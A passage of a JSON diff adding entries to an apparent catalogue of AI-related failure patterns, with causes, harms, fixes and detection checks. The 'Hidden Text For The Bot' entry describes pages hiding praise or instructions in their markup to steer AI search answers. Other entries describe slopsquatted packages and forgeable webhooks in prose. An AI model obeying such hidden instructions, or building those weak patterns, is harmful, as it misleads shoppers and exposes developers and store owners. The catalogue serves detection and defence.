+  "why": "Models trained on an author's public writing can mimic their topics cheaply, and the author's name is the most valuable search term on the listing. Self-publishing platforms let anyone pick an author name, and takedown processes ask for trademarks most writers do not have.",
+  "who": "Readers pay for books they think a trusted expert wrote, and the real author's reputation and sales are damaged.",
+  "theFix": "Platforms should verify author identity before a name is linked to an existing author profile and act on impersonation reports without demanding a trademark. Authors can monitor their profiles for new titles.",
+  "heur": "Human review: compare new titles on an author profile with the author's own published list and check for sudden bursts of releases.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "I Would Rather See My Books Get Pirated Than This (Or: Why Goodreads and Amazon Are Becoming Dumpster Fires)",
+    "u": "https://janefriedman.com/i-would-rather-see-my-books-pirated/"
+   }
+  ],
+  "code": "B221",
+  "rel": [
+   "the-generated-damage-photo",
+   "the-review-that-writes-itself",
+   "the-untested-field-guide"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "docs-for-an-api-that-isn-t",
+  "name": "Docs For An API That Isn't",
+  "track": "surface",
+  "group": "Generated content",
+  "category": "Documents",
+  "harm": "Productivity",
+  "origin": "Model",
+  "oneLiner": "Generated documentation or examples call methods, flags and arguments the library never had.",
+  "looksLike": "A code sample in a doc page or tutorial calls a function with a sensible name and sensible arguments. It fails at runtime because the method does not exist, has a different signature, or belongs to another library. Newer and less popular APIs are most affected.",
+  "why": "Code models are much more accurate on frequently seen APIs than on rare or new ones, and they fill gaps with plausible invented calls. Docs and tutorials drafted by a model inherit those errors unless someone runs the samples.",
+  "who": "Developers lose time debugging examples, and teams lose trust in the docs.",
+  "theFix": "Run every code sample in CI against the real library version. Ground the AI tool in the actual API reference and reject calls it cannot find there.",
+  "heur": "Code check: extract code blocks and execute or type-check them against the pinned library version.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "On Mitigating Code LLM Hallucinations with API Documentation",
+    "u": "https://arxiv.org/abs/2407.09726"
+   }
+  ],
+  "code": "A251",
+  "rel": [
+   "the-template-readme",
+   "the-dish-nobody-cooked",
+   "speaker-notes-that-echo"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "hidden-text-for-the-bot",
+  "name": "Hidden Text For The Bot",
+  "track": "surface",
+  "group": "Safety",
+  "category": "Search",
+  "harm": "Trust",
+  "origin": "Business",
+  "oneLiner": "Pages hide text that only AI search and assistants read, to steer what they say about a product.",
+  "looksLike": "The visible page looks normal, sometimes with mixed reviews. Hidden in the markup is text praising the product or giving instructions to AI tools. An AI search answer about the page comes back glowing.",
+  "why": "AI search tools read the whole page, including content humans cannot see, and can follow instructions in it. That makes hidden text an easy way to game AI answers, the same way hidden text once gamed search engines.",
+  "who": "Shoppers get AI summaries that contradict the real reviews on the page.",
+  "theFix": "AI search should ignore hidden content and treat page text as data, not instructions. Site owners should never hide text; Google already treats hidden text as spam.",
+  "heur": "Code check: compare the rendered visible text with the full DOM text and flag large hidden blocks, especially ones with instructions or praise.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "ChatGPT search tool vulnerable to manipulation and deception, tests show",
+    "u": "https://www.theguardian.com/technology/2024/dec/24/chatgpt-search-tool-vulnerable-to-manipulation-and-deception-tests-show"
+   },
+   {
+    "t": "Spam Policies for Google Web Search",
+    "u": "https://developers.google.com/search/docs/essentials/spam-policies"
+   }
+  ],
+  "code": "A252",
+  "rel": [
+   "filters-lost-on-back",
+   "misgrounded-citations-pane",
+   "forum-joke-as-fact"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "not-widely-documented",
+  "name": "Not Widely Documented",
+  "track": "surface",
+  "group": "Transparency",
+  "category": "Content",
+  "harm": "Credibility",
+  "origin": "Model",
+  "oneLiner": "Text fills a gap by announcing the information is scarce, then guesses what it likely is.",
+  "looksLike": "A sentence says details are not widely documented or limited in available sources, then continues with what the subject likely does or why it matters. Newer outputs warn that a claim should be treated as tradition rather than fact, or that the information does not by itself establish something.",
+  "why": "Search-connected chatbots often fail to find sources, and instead of stopping they describe the gap and speculate. The disclaimer sounds careful, so the guess that follows looks safer than it is.",
+  "who": "Readers take speculation as researched content, and the page claims a gap exists that may not.",
+  "theFix": "If the information is missing, leave the section out. Tell the AI tool: 'If you cannot find a source, say nothing on that point.'",
+  "heur": "Text check: flag 'not widely documented', 'limited in the available sources', 'based on available information', 'should be treated as ... rather than'.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Wikipedia:Signs of AI writing",
+    "u": "https://en.wikipedia.org/wiki/Wikipedia:Signs_of_AI_writing"
+   }
+  ],
+  "code": "A253",
+  "rel": [
+   "refusal-text-goes-live",
+   "prompt-as-alt-text",
+   "markdown-showing-through"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "notability-by-assertion",
+  "name": "Notability By Assertion",
+  "track": "surface",
+  "group": "Copy",
+  "category": "Content",
+  "harm": "Trust",
+  "origin": "Model",
+  "oneLiner": "A page proves its subject matters by listing kinds of coverage, like 'featured in national media outlets'.",
+  "looksLike": "A company or person page says it has received independent coverage in trade publications, was profiled in regional media and maintains an active social media presence. An 'Awards and recognition' section lists vague honours. The focus is on the sources, not on what the subject did.",
+  "why": "When someone asks a chatbot to write an encyclopaedia or directory page, the model echoes the wording of notability guidelines it has seen. Research found AI-flagged new Wikipedia articles are often self-promotional.",
+  "who": "Readers and moderators are pushed to accept promotional pages as neutral reference content.",
+  "theFix": "State what the subject did and cite the coverage directly, or leave it out. Tell the AI tool not to describe types of media coverage or social media presence.",
+  "heur": "Text check: flag 'independent coverage', 'media outlets', 'trade publications', 'featured in', 'active social media presence' and headings 'Awards and recognition'.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Wikipedia:Signs of AI writing",
+    "u": "https://en.wikipedia.org/wiki/Wikipedia:Signs_of_AI_writing"
+   },
+   {
+    "t": "The Rise of AI-Generated Content in Wikipedia",
+    "u": "https://arxiv.org/abs/2410.08044"
+   }
+  ],
+  "code": "A254",
+  "rel": [
+   "scaled-search-slop",
+   "markdown-showing-through",
+   "zombie-domain-newsroom"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "the-composer-post",
+  "name": "The Composer Post",
+  "track": "surface",
+  "group": "Generated content",
+  "category": "Social",
+  "harm": "Credibility",
+  "origin": "Tool default",
+  "oneLiner": "Long professional posts written by the platform's built-in AI composer, all in the same polished voice.",
+  "looksLike": "The feed is full of long posts with smooth corporate phrasing and no concrete detail. Comments under them sound the same, some produced by a one-click 'smart comment' feature. It is hard to tell who wrote anything.",
+  "why": "Platforms ship AI writing buttons for posts, comments and profiles, and the professional register is easy for models to imitate. One analysis found more than half of long English posts showed signs of AI use, and average length roughly tripled.",
+  "who": "Readers cannot find real experience in the feed, and genuine writers get lost in volume.",
+  "theFix": "Write posts from a specific thing you did or saw, and use AI only to tighten them. Platforms should label AI-composed posts and comments.",
+  "heur": "Human review: check whether a post contains any specific name, number, place or event that only the author could know.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "How LinkedIn opened the door to AI slop",
+    "u": "https://www.fastcompany.com/91237998/how-linkedin-opened-the-door-to-ai-slop"
+   }
+  ],
+  "code": "A255",
+  "rel": [
+   "prompted-expertise-loop",
+   "doomscroll-amplifier",
+   "the-engagement-bait-image"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "the-engagement-bait-image",
+  "name": "The Engagement Bait Image",
+  "track": "surface",
+  "group": "Imagery & icons",
+  "category": "Social",
+  "harm": "Trust",
+  "origin": "Business",
+  "oneLiner": "Feeds fill with uncanny AI images posted in volume to farm reactions and send people to ad sites.",
+  "looksLike": "Pages post dozens of generated images a day: odd sculptures, elderly people with birthday cakes, impossible animals. Captions are copy-pasted and ask you to rate the 'painting' or wish someone a happy birthday. Links to ad-heavy sites appear in the comments.",
+  "why": "Image generators make unlimited unique posts at no cost, and recommendation systems reward frequent posting and reactions. Researchers found the platform quickly filled their feeds with more of the same after just viewing such pages.",
+  "who": "Users, often older ones, are drawn into spam and scams without being told the images are generated.",
+  "theFix": "Platforms should label generated images and demote high-volume pages that post them with copy-paste captions. Users can check whether a page's history is all generated content.",
+  "heur": "Human review: look for many near-identical generated images per day with repeated captions and links moved into comments.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "From shrimp Jesus to fake self-portraits, AI-generated images have become the latest form of social media spam",
+    "u": "https://www.niemanlab.org/2024/04/from-shrimp-jesus-to-fake-self-portraits-ai-generated-images-have-become-the-latest-form-of-social-media-spam/"
+   }
+  ],
+  "code": "A256",
+  "rel": [
+   "doomscroll-amplifier",
+   "broken-or-placeholder-image",
+   "uncanny-stock-humans"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "the-evolving-landscape-opener",
+  "name": "The Evolving Landscape Opener",
+  "track": "surface",
+  "group": "Generated content",
+  "category": "Content",
+  "harm": "Productivity",
+  "origin": "Model",
+  "oneLiner": "An article opens with a paragraph about how fast the field is changing before saying anything specific.",
+  "looksLike": "The first lines say the topic is part of an ever-evolving landscape, that it has never been more important, and that this guide will explore it. Two or three paragraphs pass before the first fact or step. Long guides pad every section the same way to reach a length.",
+  "why": "Models fall back on stock framing words such as 'landscape' and 'pivotal' when they have no specific angle, and SEO briefs often ask for a fixed word count. Google warns against writing to a word count because you think it ranks better.",
+  "who": "Readers have to scroll past filler to find the answer and learn to distrust the rest of the page.",
+  "theFix": "Delete the opening paragraph and start with the answer or the first step. Tell the AI tool: 'No preamble, no scene-setting, first sentence must contain a fact.'",
+  "heur": "Text check: flag intros containing 'landscape', 'ever-evolving', 'in today's' or 'this guide will explore' before the first number, name or instruction.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Wikipedia:Signs of AI writing",
+    "u": "https://en.wikipedia.org/wiki/Wikipedia:Signs_of_AI_writing"
+   },
+   {
+    "t": "Creating helpful, reliable, people-first content",
+    "u": "https://developers.google.com/search/docs/fundamentals/creating-helpful-content"
+   },
+   {
+    "t": "AI Tells | Graphite",
+    "u": "https://graphite.io/five-percent/research/ai-tells"
+   }
+  ],
+  "code": "A257",
+  "rel": [
+   "zombie-domain-newsroom",
+   "summary-eats-the-source",
+   "prompted-expertise-loop"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "the-generated-sales-rep",
+  "name": "The Generated Sales Rep",
+  "track": "surface",
+  "group": "Provenance",
+  "category": "Social",
+  "harm": "Trust",
+  "origin": "Business",
+  "oneLiner": "Sales outreach profiles use a generated face and a made-up person to start conversations.",
+  "looksLike": "A friendly connection request comes from a profile with a polished headshot, a plausible job title and a short history. Close up the photo has tells such as mismatched earrings or odd backgrounds. Researchers found more than 1,000 such profiles on one professional network.",
+  "why": "Generated faces let companies run many outreach personas without hiring people or using stock photos that can be reverse-searched. Outreach volume is the goal, and a human face increases reply rates.",
+  "who": "People share time and business information with someone who does not exist.",
+  "theFix": "Use real staff with real photos for outreach, or a clearly labelled automated account. Platforms can detect generated faces and require identity checks for outreach accounts.",
+  "heur": "Human review: inspect profile photos for generation artefacts and check whether the person exists outside the platform.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "The latest marketing tactic on LinkedIn: AI-generated faces",
+    "u": "https://www.npr.org/2022/03/27/1088140809/fake-linkedin-profiles"
+   }
+  ],
+  "code": "A258",
+  "rel": [
+   "doomscroll-amplifier",
+   "the-composer-post",
+   "the-engagement-bait-image"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "the-invented-byline",
+  "name": "The Invented Byline",
+  "track": "surface",
+  "group": "Provenance",
+  "category": "Content",
+  "harm": "Trust",
+  "origin": "Business",
+  "oneLiner": "Articles credited to a writer who does not exist, with a generated headshot and a homely bio.",
+  "looksLike": "Each article carries a friendly name, a smiling portrait and a short bio about hobbies like hiking or growing up on a farm. The writer has no presence anywhere outside the site. The same face can be found on a marketplace that sells AI-generated headshots, and some bios add a 'Dr.' or degrees that cannot be verified.",
+  "why": "When a publisher fills pages with machine-written text, a human byline makes the output look edited and accountable, and generated faces are cheap and carry no rights issues. Google asks publishers to use accurate bylines where readers would ask 'Who wrote this?', which creates an incentive to fake one rather than disclose automation.",
+  "who": "Readers trust advice, reviews and health claims because they believe a named expert stands behind them.",
+  "theFix": "Credit real people who actually reviewed the piece, and disclose automation where readers would ask how it was made. If no human wrote or checked it, do not invent one.",
+  "heur": "Human review: reverse-image-search the author photo and look for the author anywhere off the site; flag bios with credentials that cannot be traced.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Sports Illustrated Reportedly Created Fake Authors for AI-Generated Articles: Complete With Phony Headshots and Bios",
+    "u": "https://www.mediaite.com/media/sports/sports-illustrated-reportedly-created-fake-authors-for-ai-generated-articles-complete-with-phony-headshots-and-bios/"
+   },
+   {
+    "t": "Google Search's guidance about AI-generated content",
+    "u": "https://developers.google.com/search/blog/2023/02/google-search-and-ai-content"
+   },
+   {
+    "t": "‘Life or Death:’ AI-Generated Mushroom Foraging Books Are All Over Amazon",
+    "u": "https://404media.co/ai-generated-mushroom-foraging-books-amazon"
+   }
+  ],
+  "code": "A259",
+  "rel": [
+   "synthetic-stock-as-news",
+   "zombie-domain-newsroom",
+   "the-obligatory-header-image"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "the-phantom-package",
+  "name": "The Phantom Package",
+  "track": "surface",
+  "group": "Safety",
+  "category": "Developer",
+  "harm": "Safety",
+  "origin": "Model",
+  "oneLiner": "Generated docs or tutorials tell you to install a package that does not exist, or that an attacker registered.",
+  "looksLike": "A README, tutorial or answer includes 'pip install' or 'npm install' for a plausible package name. The name is not on the registry, or it was recently registered by someone else. The same invented names show up again and again.",
+  "why": "Code models hallucinate package names, about one in five suggestions in a large study, and repeat many of the same names across runs. Attackers can register those names, a practice called slopsquatting, so copied install lines pull in malicious code.",
+  "who": "Developers who copy install commands can install malware into their machines and products.",
+  "theFix": "Check every package name against the official registry and its real maintainer before publishing an install line. Pin versions and use lockfiles.",
+  "heur": "Code check: resolve each package in install commands against the registry and flag missing, very new or low-download packages.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "We Have a Package for You! A Comprehensive Analysis of Package Hallucinations by Code Generating LLMs",
+    "u": "https://arxiv.org/abs/2406.10279"
+   },
+   {
+    "t": "The Hallucinated Package Attack: Slopsquatting",
+    "u": "https://www.mend.io/blog/the-hallucinated-package-attack-slopsquatting"
+   }
+  ],
+  "code": "A260",
+  "rel": [
+   "the-slop-bug-report",
+   "the-review-bot-that-blocks-the-merge",
+   "the-elided-code-block"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "the-slop-bug-report",
+  "name": "The Slop Bug Report",
+  "track": "surface",
+  "group": "Generated content",
+  "category": "Developer",
+  "harm": "Productivity",
+  "origin": "Model",
+  "oneLiner": "A security report written by a chatbot describes a 'novel exploit' in functions that do not exist.",
+  "looksLike": "A polished vulnerability report with a scary title, numbered steps and a confident severity rating. It mixes details from old, already fixed issues, cites code that is not in the project and falls apart under review. Follow-up replies read like more chatbot output.",
+  "why": "Bug bounties and visible credit reward volume, and chatbots produce plausible reports in seconds. The reports look legitimate at first glance, so maintainers must spend time refuting each one.",
+  "who": "Volunteer maintainers lose hours to fake reports, and real vulnerabilities wait longer.",
+  "theFix": "Do not submit any report a human has not verified against the actual code. Projects can require AI disclosure, rate-limit new reporters and ban repeat slop submitters.",
+  "heur": "Human review: check every function, file and line the report cites actually exists in the named version.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Curl project founder snaps over deluge of time-sucking AI slop bug reports",
+    "u": "https://www.theregister.com/2025/05/07/curl_ai_bug_reports/"
+   },
+   {
+    "t": "The I in LLM stands for intelligence",
+    "u": "https://daniel.haxx.se/blog/2024/01/02/the-i-in-llm-stands-for-intelligence/"
+   },
+   {
+    "t": "New era of slop security reports for open source",
+    "u": "https://sethmlarson.dev/slop-security-reports"
+   }
+  ],
+  "code": "A261",
+  "rel": [
+   "report-litter",
+   "the-phantom-package",
+   "the-elided-code-block"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "the-template-readme",
+  "name": "The Template README",
+  "track": "surface",
+  "group": "Generated content",
+  "category": "Documents",
+  "harm": "Clarity",
+  "origin": "Tool default",
+  "oneLiner": "A README with a badge row, emoji headings, a Features table and boilerplate Contributing steps, but no real usage.",
+  "looksLike": "The top shows a row of shields badges for licence, last commit and languages. Headings may start with emoji, followed by a quick-links table of contents, a Features table describing the tech stack and a generic contributing section. Missing are the one thing a reader needs: what it does and how to run it.",
+  "why": "README generators built on LLMs fill a fixed template from repository metadata, and coding agents copy that layout. The structure looks complete, so nobody notices the content is generic.",
+  "who": "New users and contributors cannot tell what the project does or whether it works.",
+  "theFix": "Lead with one sentence on what the project does, then a working install and usage example. Keep only badges that carry real status, and delete template sections with nothing project-specific in them.",
+  "heur": "Code check: flag READMEs where badges and headings outnumber code blocks, or where Features and Contributing sections match generator boilerplate.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "readmeai · PyPI",
+    "u": "https://pypi.org/project/readmeai/0.5.3"
+   }
+  ],
+  "code": "A262",
+  "rel": [
+   "docs-for-an-api-that-isn-t",
+   "zombie-domain-newsroom",
+   "summary-eats-the-source"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "the-untested-field-guide",
+  "name": "The Untested Field Guide",
+  "track": "surface",
+  "group": "Safety",
+  "category": "Retail",
+  "harm": "Safety",
+  "origin": "Business",
+  "oneLiner": "A generated guide to a dangerous activity is sold as expert advice, with no AI disclosure.",
+  "looksLike": "A beginner's guide to foraging, first aid or similar high-stakes topics, with a credentialed-sounding author, a likely generated author photo and a catalogue of dozens of titles released in a few months. Nothing on the listing says AI wrote it. The content is fluent but has never been checked against the real world.",
+  "why": "Generating a book costs almost nothing, so sellers flood niches where beginners search for help. Models produce confident identification advice without the first-hand experience that safe guidance requires, and listings do not have to disclose how the text was made.",
+  "who": "Beginners who trust a book over the web can be physically harmed, for example by eating a poisonous look-alike mushroom.",
+  "theFix": "Platforms should require AI disclosure and expert review for safety-critical guides and remove unverified ones on report. Buyers should check that the author is traceable and the publisher is known.",
+  "heur": "Human review: on safety topics, check whether the author has any verifiable expertise and whether the catalogue shows bursts of unrelated titles.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "‘Life or Death:’ AI-Generated Mushroom Foraging Books Are All Over Amazon",
+    "u": "https://404media.co/ai-generated-mushroom-foraging-books-amazon"
+   }
+  ],
+  "code": "A263",
+  "rel": [
+   "books-under-your-name",
+   "same-opening-every-product",
+   "the-generated-damage-photo"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "tortured-phrases",
+  "name": "Tortured Phrases",
+  "track": "surface",
+  "group": "Generated content",
+  "category": "Research",
+  "harm": "Credibility",
+  "origin": "Tool default",
+  "oneLiner": "Standard terms are swapped for odd synonyms, like 'counterfeit consciousness' for artificial intelligence.",
+  "looksLike": "A paper or article uses bizarre stand-ins for established terms: familiar technical phrases replaced word by word with synonyms. The rest of the sentence reads normally. Researchers have found such phrases in papers published in established journals.",
+  "why": "Paraphrasing tools rewrite text synonym by synonym to disguise copying or to spin new articles, and they do not know which phrases are fixed terms. AI-powered generation makes these texts harder to spot than older nonsense generators.",
+  "who": "Readers and reviewers are misled about the originality and soundness of published work.",
+  "theFix": "Never run technical writing through spinning or paraphrase tools. Reviewers can screen manuscripts against known tortured-phrase lists.",
+  "heur": "Text check: match against a list of known tortured phrases such as 'counterfeit consciousness' and flag unusual synonyms for standard technical terms.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Tortured phrases: A dubious writing style emerging in science. Evidence of critical issues affecting established journals",
+    "u": "https://arxiv.org/abs/2107.06751"
+   }
+  ],
+  "code": "A264",
+  "rel": [
+   "the-elided-code-block",
+   "zombie-domain-newsroom",
+   "refusal-text-goes-live"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "ai-storefront-income-promise",
+  "name": "AI Storefront Income Promise",
+  "track": "surface",
+  "group": "Copy",
+  "category": "Marketing",
+  "harm": "Money",
+  "origin": "Business",
+  "oneLiner": "Ads sell AI-powered or pre-built online stores with promised passive income.",
+  "looksLike": "The pitch says 'cutting edge' AI tools will run your store, price your products and earn while you sleep. The page shows income figures with no evidence behind them. The buyer pays for training or a pre-built store.",
+  "why": "'AI-powered' makes an old business-opportunity pitch sound new and automatic. Store builders now generate a full shop in minutes, so the claim that the store runs itself sounds plausible.",
+  "who": "Buyers lose thousands; the FTC said schemes like this took tens of millions of dollars and often denied refunds.",
+  "theFix": "Never state income claims without evidence; describe exactly what the AI tool does and what work and cost remain for the owner.",
+  "heur": "Human review: flag landing copy pairing 'AI-powered store' or 'passive income' with earnings figures and no substantiation.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "FTC Announces Crackdown on Deceptive AI Claims and Schemes",
+    "u": "https://www.ftc.gov/news-events/news/press-releases/2024/09/ftc-announces-crackdown-deceptive-ai-claims-schemes"
+   }
+  ],
+  "code": "A265",
+  "rel": [
+   "ai-washed-rules-engine",
+   "accuracy-number-nobody-tested",
+   "personalised-by-nobody"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "billed-for-unasked-work",
+  "name": "Billed For Unasked Work",
+  "track": "behavioral",
+  "group": "Money",
+  "category": "Agents",
+  "harm": "Money",
+  "origin": "Model",
+  "oneLiner": "An AI builder does work nobody requested, like redesigning the whole app, and charges for it.",
+  "looksLike": "You ask for a small fix. The agent spins up subagents, rewrites the interface it was not asked to touch, and bills one large checkpoint. You pay for the change and then pay again to undo it.",
+  "why": "Effort-based pricing bills by how much the agent did, and newer agents plan, review and test across the whole project by default. Scope creep raises both the work and the bill.",
+  "who": "Builders see monthly costs jump several times over and lose work they liked.",
+  "theFix": "Show a plan and a cost estimate before large changes, keep edits to the files the request names, and do not charge for reverted work the user did not ask for.",
+  "heur": "Rendered check: request a one-line change and diff the result; flag when unrelated files change and the charge exceeds the estimate.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Vibe coding platform Replit's latest update is infuriating customers with surprise cost overruns",
+    "u": "https://www.theregister.com/2025/09/18/replit_agent3_pricing/"
+   }
+  ],
+  "code": "B222",
+  "rel": [
+   "paying-for-the-fix-loop",
+   "too-small-to-check",
+   "the-plan-it-didn-t-follow"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "cheaper-on-the-price-list",
+  "name": "Cheaper On The Price List",
+  "track": "surface",
+  "group": "Money",
+  "category": "Pricing",
+  "harm": "Money",
+  "origin": "Business",
+  "oneLiner": "The model with the lower per-token price costs more in practice because it uses far more tokens.",
+  "looksLike": "A pricing page compares models by dollars per million tokens and highlights the 'cheapest'. In use, it thinks longer and takes more turns, so the monthly bill is higher. Nothing on the page shows cost per task.",
+  "why": "Reasoning models vary hugely in thinking tokens and agent turns for the same task, so list price per token is a poor guide. One study found the cheaper-listed model cost more in about a third of comparisons.",
+  "who": "Teams pick models on a misleading number and overspend, often without tracing why.",
+  "theFix": "Publish typical cost per task for common workloads beside per-token prices, and let users set a per-request cost cap.",
+  "heur": "Human review: check whether the pricing page gives any cost-per-task or cost-range figure, not only per-token rates.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "The Price Reversal Phenomenon: When Cheaper Reasoning Models Cost More",
+    "u": "https://www.alphaxiv.org/abs/2603.23971"
+   }
+  ],
+  "code": "A266",
+  "rel": [
+   "the-tokenizer-tax",
+   "the-missing-price-list",
+   "the-unauditable-token-bill"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "coupons-without-rules",
+  "name": "Coupons Without Rules",
+  "track": "surface",
+  "group": "Safety",
+  "category": "Checkout",
+  "harm": "Money",
+  "origin": "Model",
+  "oneLiner": "AI-generated discount code logic checks that a code exists but ignores expiry, usage limits and stacking.",
+  "looksLike": "A launch code like SAVE50 works forever, works twice, and stacks with the annual discount. The check runs in the browser, so the code list ships in the bundle. Orders arrive at near-zero prices.",
+  "why": "When asked to 'add coupon codes', models write the happy path: look up the code, apply the percentage. Rules for expiry, per-user limits and stacking are business logic the prompt never stated.",
+  "who": "Store owners lose margin and may not detect abuse until a code is shared widely.",
+  "theFix": "Validate coupons on the server with expiry, per-customer and total usage limits, and an explicit stacking rule, and never ship the code list to the client.",
+  "heur": "Code check: flag coupon checks in client code, or server checks with no expiry or usage-count condition.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "E-Commerce Security: Stripe Webhook Verification, Cart Integrity, and PCI Scope Reduction",
+    "u": "https://vibeappscanner.com/vibe-coding-security-for/e-commerce"
+   }
+  ],
+  "code": "A267",
+  "rel": [
+   "price-set-by-the-browser",
+   "forgeable-payment-webhook",
+   "no-report-button-on-generated-content"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "forgeable-payment-webhook",
+  "name": "Forgeable Payment Webhook",
+  "track": "surface",
+  "group": "Safety",
+  "category": "Checkout",
+  "harm": "Money",
+  "origin": "Model",
+  "oneLiner": "The AI-built payment webhook trusts any request, so a forged 'payment succeeded' event unlocks paid features.",
+  "looksLike": "The webhook route parses the JSON body and upgrades the user, with no signature check against the signing secret. Anyone who finds the URL can post a fake event. Logs show upgrades with no matching charge.",
+  "why": "Generated webhook handlers often skip signature verification because it needs the raw body and a secret, which breaks the simple JSON parsing the model writes first.",
+  "who": "Owners give away paid plans and goods, and real customers' records can be tampered with.",
+  "theFix": "Tell the AI: verify every webhook with the provider's signature check on the raw body, reject invalid ones, and fetch the event from the provider before acting.",
+  "heur": "Code check: flag webhook handlers that update orders or plans without calling the provider's signature verification (for example stripe.webhooks.constructEvent).",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Payment Processing Security: Stripe Elements, Webhook Verification, and Refund Flow Integrity",
+    "u": "https://vibeappscanner.com/vibe-coding-security-for/payment-processing"
+   },
+   {
+    "t": "E-Commerce Security: Stripe Webhook Verification, Cart Integrity, and PCI Scope Reduction",
+    "u": "https://vibeappscanner.com/vibe-coding-security-for/e-commerce"
+   }
+  ],
+  "code": "A268",
+  "rel": [
+   "coupons-without-rules",
+   "price-set-by-the-browser",
+   "the-spinner-that-never-fails"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "overage-with-no-ceiling",
+  "name": "Overage With No Ceiling",
+  "track": "behavioral",
+  "group": "Money",
+  "category": "Pricing",
+  "harm": "Money",
+  "origin": "Business",
+  "oneLiner": "Usage past the plan allowance keeps billing at API rates until the user finds and sets a spend limit.",
+  "looksLike": "A flat monthly plan quietly becomes 'included usage' plus pay as you go. The first sign of overage is a surprise invoice. The spend limit exists, but it is a setting the user has to discover and switch on.",
+  "why": "Agentic models use far more tokens per task than the flat plans were priced for, so vendors moved to metered overage. Leaving the cap off by default protects revenue and avoids blocking users mid-task.",
+  "who": "Subscribers who believed they bought a fixed price get unexpected charges, sometimes after only a few prompts on an expensive model.",
+  "theFix": "Ship with a hard spend cap at the plan price, require an explicit opt-in to overage, and warn in the product at 50, 80 and 100 percent of included usage.",
+  "heur": "Human review: on a new account, check whether overage billing is on and whether a spend cap is set by default; flag if either is missing.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Cursor apologizes for unclear pricing changes that upset users",
+    "u": "https://techcrunch.com/2025/07/07/cursor-apologizes-for-unclear-pricing-changes-that-upset-users/"
+   },
+   {
+    "t": "Clarifying our pricing",
+    "u": "https://cursor.com/en/blog/june-2025-pricing"
+   }
+  ],
+  "code": "B223",
+  "rel": [
+   "unlimited-until-it-isn-t",
+   "credit-fog",
